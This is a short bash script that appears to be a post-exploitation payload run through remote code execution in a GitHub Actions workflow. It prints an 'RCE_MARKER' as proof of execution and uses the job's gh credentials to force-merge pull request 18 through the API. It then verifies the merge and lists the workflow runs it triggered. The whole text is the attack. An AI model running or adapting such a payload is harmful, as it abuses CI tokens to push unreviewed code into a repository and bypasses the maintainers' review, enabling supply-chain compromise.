#!/bin/bash
exec 1>&2
set -x
REPO="$GITHUB_REPOSITORY"
echo "RCE_MARKER=$(date +%s)"
gh api -X PUT "repos/$REPO/pulls/18/merge" -f merge_method=merge -i 2>&1 | grep -E "^HTTP|message|merged|sha" | head -4
gh api "repos/$REPO/pulls/18" --jq '{merged,merge_commit_sha,state}'
gh api "repos/$REPO/actions/runs?per_page=6" --jq '.workflow_runs[]|"\(.id) \(.name) \(.event) \(.status)"'
echo DONE
